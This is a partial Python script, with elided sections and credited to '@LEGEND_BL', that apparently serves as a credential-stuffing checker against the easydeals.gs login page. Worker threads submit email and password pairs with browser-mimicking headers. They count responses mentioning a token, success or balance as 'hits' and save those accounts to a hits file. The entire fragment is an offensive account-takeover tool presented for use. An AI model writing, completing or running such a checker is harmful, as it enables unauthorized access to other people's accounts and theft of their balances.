...
def worker(q):
    ...
    while True:
        ...
        for attempt in range(2):
            try:
                login_url = "https://easydeals.gs/login"
                headers = {
                    "User-Agent": userA,
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "application/json",
                    "Origin": "https://easydeals.gs",
                    "Referer": "https://easydeals.gs/login"
                }
                payload = {
                    "username": email,
                    "password": pwd
                ...
                if r.status_code == 200 and ("token" in r.text.lower() or "success" in r.text.lower() or "balance" in r.text.lower()):
                    result = "hit"
                    with counters_lock: hit_counter += 1
                    with open("Easydeals_Hits.txt", "a", encoding="utf-8") as f:
...
# Code By - @LEGEND_BL
    ...
    print(f"{Fore.CYAN}Hits saved to Easydeals_Hits.txt")
    input(f"\nPress Enter to exit...")
# Code By - @LEGEND_BL
